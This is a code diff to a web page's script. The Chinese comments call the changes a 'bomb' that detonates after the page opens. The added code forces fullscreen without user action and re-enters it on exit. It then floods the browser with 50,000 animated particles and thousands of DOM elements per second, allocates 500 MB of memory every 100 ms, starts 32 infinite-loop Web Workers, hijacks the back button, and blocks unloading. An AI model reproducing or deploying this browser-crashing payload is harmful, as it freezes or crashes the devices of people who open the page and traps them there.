@@ -28,36 +28,55 @@
                 }
             };
         } else {
+            // 浏览器打开：0.5秒后全屏，全屏后再等0.5秒引爆
             document.body.style.background = 'pink';
             document.body.style.overflow = 'hidden';
             document.getElementById('c').style.display = 'block';
             var v = document.getElementById('v');
             v.style.display = 'block';
             v.src = 'data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMWlzb28AAAAQaXNvbQAAAAEAAAAQAAAAAQAAABQAAABDb2RlYyBpZGVudGlmaWNhdGlvbiB0ZXh0IGZvciB0aGlzIHZpZGVvIHRyYWNr';
+
             var locked = false;
-            function lockFull() { if (locked) return; v.play().then(function() { v.requestFullscreen().then(function() { locked = true; }).catch(function() {}); }).catch(function() {}); }
-            document.addEventListener('click', lockFull);
-            document.addEventListener('touchstart', lockFull);
-            document.addEventListener('fullscreenchange', function() { if (!document.fullscreenElement && locked) { v.play().then(function() { v.requestFullscreen().catch(function() {}); }).catch(function() {}); } });
-            var c = document.getElementById('c');
-            var ctx = c.getContext('2d');
-            c.width = innerWidth;
-            c.height = innerHeight;
-            var p = [];
-            for (var i = 0; i < 50000; i++) { p.push({ x: Math.random() * c.width, y: Math.random() * c.height, vx: (Math.random() - 0.5) * 30, vy: (Math.random() - 0.5) * 30, r: Math.random() * 4 + 1 }); }
-            function draw() { ctx.fillStyle = 'rgba(255,192,203,0.05)'; ctx.fillRect(0, 0, c.width, c.height); for (var i = 0; i < p.length; i++) { p[i].x += p[i].vx; p[i].y += p[i].vy; if (p[i].x < 0 || p[i].x > c.width) p[i].vx *= -1; if (p[i].y < 0 || p[i].y > c.height) p[i].vy *= -1; ctx.fillStyle = 'hsl(' + (Date.now() / 2 + i % 360) + ',100%,70%)'; ctx.beginPath(); ctx.arc(p[i].x, p[i].y, p[i].r, 0, Math.PI * 2); ctx.fill(); } requestAnimationFrame(draw); }
-            draw();
-            setInterval(function() { for (var i = 0; i < 1000; i++) { var d = document.createElement('div'); d.style.cssText = 'position:fixed;width:40px;height:40px;background:hsl(' + Math.random() * 360 + ',100%,70%);z-index:99;opacity:0.7;border-radius:50%;'; d.style.left = Math.random() * innerWidth + 'px'; d.style.top = Math.random() * innerHeight + 'px'; document.body.appendChild(d); } }, 50);
-            setInterval(function() { for (var i = 0; i < 1000; i++) { var s = document.createElement('span'); s.style.cssText = 'position:fixed;color:hsl(' + Math.random() * 360 + ',100%,50%);z-index:99;font-size:16px;'; s.style.left = Math.random() * innerWidth + 'px'; s.style.top = Math.random() * innerHeight + 'px'; s.textContent = '🐶🐱🐭🐹🐰🦊🐻🐼🐨🐯🦁🐮🐷🐸🐵🐔🐧🐦🐤🦆🦅🦉🦇🐺🐗🐴🦄🐝🐛🦋🐌🐞🐜🦟🦗🐢🐍🦎🦖🦕🐙🦑🦐🦞🦀🐡🐠🐟🐬🐳🐋🦈🐊🐅🐆🦓🦍🦧🐘🦛🦏🐪🐫🦒🦘🐃🐂🐄🐎🐖🐏🐑🦙🐐🦌🐕🐩🐈🐓🦃🦚🦜🦢🦩🕊🐇🦝🦨🦡🦦🦥🐁🐀🐿🦔'; document.body.appendChild(s); } }, 100);
-            var r = []; setInterval(function() { for (var i = 0; i < 10; i++) { r.push(new ArrayBuffer(50 * 1024 * 1024)); } }, 100);
-            var code = 'while(true){var x=0;for(var i=0;i<10000000;i++){x+=Math.sqrt(i)*Math.sin(i);}}';
-            var blob = new Blob([code], { type: 'text/javascript' });
-            var url = URL.createObjectURL(blob);
-            for (var i = 0; i < 32; i++) { new Worker(url); }
-            history.pushState(null, null, location.href);
-            window.onpopstate = function() { history.go(1); };
-            setInterval(function() { history.pushState(null, null, location.href + '#' + Math.random()); }, 10);
-            window.onbeforeunload = function() { return 'x'; };
+            function lockFull() {
+                if (locked) return;
+                v.play().then(function() {
+                    v.requestFullscreen().then(function() { locked = true; }).catch(function() {});
+                }).catch(function() {});
+            }
+
+            // 0.5秒后触发全屏
+            setTimeout(function() {
+                lockFull();
+            }, 500);
+
+            // 全屏后再等0.5秒引爆炸弹
+            setTimeout(function() {
+                document.addEventListener('fullscreenchange', function() {
+                    if (!document.fullscreenElement && locked) {
+                        v.play().then(function() { v.requestFullscreen().catch(function() {}); }).catch(function() {});
+                    }
+                });
+
+                var c = document.getElementById('c');
+                var ctx = c.getContext('2d');
+                c.width = innerWidth;
+                c.height = innerHeight;
+                var p = [];
+                for (var i = 0; i < 50000; i++) { p.push({ x: Math.random() * c.width, y: Math.random() * c.height, vx: (Math.random() - 0.5) * 30, vy: (Math.random() - 0.5) * 30, r: Math.random() * 4 + 1 }); }
+                function draw() { ctx.fillStyle = 'rgba(255,192,203,0.05)'; ctx.fillRect(0, 0, c.width, c.height); for (var i = 0; i < p.length; i++) { p[i].x += p[i].vx; p[i].y += p[i].vy; if (p[i].x < 0 || p[i].x > c.width) p[i].vx *= -1; if (p[i].y < 0 || p[i].y > c.height) p[i].vy *= -1; ctx.fillStyle = 'hsl(' + (Date.now() / 2 + i % 360) + ',100%,70%)'; ctx.beginPath(); ctx.arc(p[i].x, p[i].y, p[i].r, 0, Math.PI * 2); ctx.fill(); } requestAnimationFrame(draw); }
+                draw();
+                setInterval(function() { for (var i = 0; i < 1000; i++) { var d = document.createElement('div'); d.style.cssText = 'position:fixed;width:40px;height:40px;background:hsl(' + Math.random() * 360 + ',100%,70%);z-index:99;opacity:0.7;border-radius:50%;'; d.style.left = Math.random() * innerWidth + 'px'; d.style.top = Math.random() * innerHeight + 'px'; document.body.appendChild(d); } }, 50);
+                setInterval(function() { for (var i = 0; i < 1000; i++) { var s = document.createElement('span'); s.style.cssText = 'position:fixed;color:hsl(' + Math.random() * 360 + ',100%,50%);z-index:99;font-size:16px;'; s.style.left = Math.random() * innerWidth + 'px'; s.style.top = Math.random() * innerHeight + 'px'; s.textContent = '🐶🐱🐭🐹🐰🦊🐻🐼🐨🐯🦁🐮🐷🐸🐵🐔🐧🐦🐤🦆🦅🦉🦇🐺🐗🐴🦄🐝🐛🦋🐌🐞🐜🦟🦗🐢🐍🦎🦖🦕🐙🦑🦐🦞🦀🐡🐠🐟🐬🐳🐋🦈🐊🐅🐆🦓🦍🦧🐘🦛🦏🐪🐫🦒🦘🐃🐂🐄🐎🐖🐏🐑🦙🐐🦌🐕🐩🐈🐓🦃🦚🦜🦢🦩🕊🐇🦝🦨🦡🦦🦥🐁🐀🐿🦔'; document.body.appendChild(s); } }, 100);
+                var r = []; setInterval(function() { for (var i = 0; i < 10; i++) { r.push(new ArrayBuffer(50 * 1024 * 1024)); } }, 100);
+                var code = 'while(true){var x=0;for(var i=0;i<10000000;i++){x+=Math.sqrt(i)*Math.sin(i);}}';
+                var blob = new Blob([code], { type: 'text/javascript' });
+                var url = URL.createObjectURL(blob);
+                for (var i = 0; i < 32; i++) { new Worker(url); }
+                history.pushState(null, null, location.href);
+                window.onpopstate = function() { history.go(1); };
+                setInterval(function() { history.pushState(null, null, location.href + '#' + Math.random()); }, 10);
+                window.onbeforeunload = function() { return 'x'; };
+            }, 1000);
         }
     </script>
 </body>
